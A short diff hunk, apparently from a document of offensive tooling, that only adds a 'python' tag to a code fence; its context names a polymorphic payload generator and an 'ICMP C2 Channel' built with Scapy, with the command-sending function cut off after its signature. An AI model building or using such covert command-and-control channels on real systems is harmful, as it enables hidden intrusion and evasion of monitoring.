@@ -138,7 +138,7 @@ print(f"Generated Payload: {polymorphic_payload.hex()}")
 
 ICMP C2 Channel (Python + Scapy)
 
-```
+```python
 from scapy.all import *
 
 def send_icmp_command(target_ip, command):
